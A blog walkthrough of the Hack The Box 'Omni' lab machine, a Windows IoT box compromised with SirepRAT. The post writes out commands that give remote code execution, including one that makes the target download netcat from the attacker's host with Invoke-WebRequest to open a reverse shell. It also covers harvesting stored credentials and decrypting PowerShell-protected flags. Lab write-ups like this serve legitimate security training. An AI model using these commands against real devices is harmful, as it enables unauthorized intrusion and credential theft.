---
layout: post
title: "Hack The Box - Omni"
date: 2021-01-07
---
<div markdown="1" class="box">
![](/image/omni/omniThumbnail.png)

Welcome back! This is my Hack The Box Omni Writeup, an easy rated box (?)

## Summary :
+ nmap
+ SirepRAT
+ Windows Device Portal
+ PowerShell decrypt


## Enumeration :  

At first i need to see what port that available in this box.Interesting.... its a Windows IOT box, lets check the port 8080.

![](/image/omni/nmap.JPG)

I need sum credential, where to get that thing? I've tried the default credentials (Administrator:p@ssw0rd) but that didn't work, Then i do some enumeration for Windows IOT exploit and i got SirepRAT for RCE.
*Check this GitHub : **[SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)**

![](/image/omni/web1.JPG)

SirepRAT can upload and run arbitrary code, lets use that features to upload netcat :3

Upload :
```python
python SirepRAT.py [machineIP] PutFileOnDevice --remote_path "C:\Windows\System32\uploaded.txt" --data "Hello IoT world!"
```

Run Arbitrary Code :
```python
python SirepRAT.py [machineIP] LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"

```
Upload NetCat with this command : 

```python
python SirepRAT.py [HTBboxIP] LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest [AttackingMachineIP]/nc64.exe -OutFile C:\\Windows\\System32\\nc64.exe" 
```

and don't forget to make your own python server (either with python2 or python3).


+ python2 -> python -m SimpleHTTPServer [port]
+ python3 -> python3 -m http.server [port]

![large](/image/omni/uploadNC.JPG)

After that, run the nc and set the listener.

![large](/image/omni/runNC.JPG)

And i got the reverse shell. After diggin in the box, i got this credentials on C:\Program Files\WindowsPowerShell\PackageManagement and list the hidden file with **ls -force** or **dir /ah** (haven't tried it yet), take a note of this credentials and use it to login in the webpage.

![](/image/omni/exploit1.JPG)

![](/image/omni/creds1.JPG)

Logged in to the website, and i can run commands. Lets run our nc again.

![](/image/omni/runCommand.JPG)

## User Flag :

Time to find the user flag, but in C:\Users i can't find the user flag. Just enumerate other available disk with **gdr -PSProvider 'FileSystem'** and there is U: disk and the encrypted user flag.

![](/image/omni/diskList.JPG)

![](/image/omni/encryptedUser.JPG)

But how to decrypt the encrypted user flag? then i found this website **[link](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/)** to decrypt the user flag. 

![](/image/omni/userFlag.JPG)

## Root Flag :

Remember on the previous enumeration that i got 2 credentials for app and administrator? use the administrator credentials to get the root flag and repeat the previous steps. *by the way, whoami doesn't work in this box. So use $env:username 

![](/image/omni/web2.JPG)

![](/image/omni/encryptedRoot.JPG)

![](/image/omni/rootFlag.JPG)

That's it, i've learned many things in this box such as how to exploit a Windows IOT with SirepRAT and decrypt Powershell password. 

Fin.

</div>


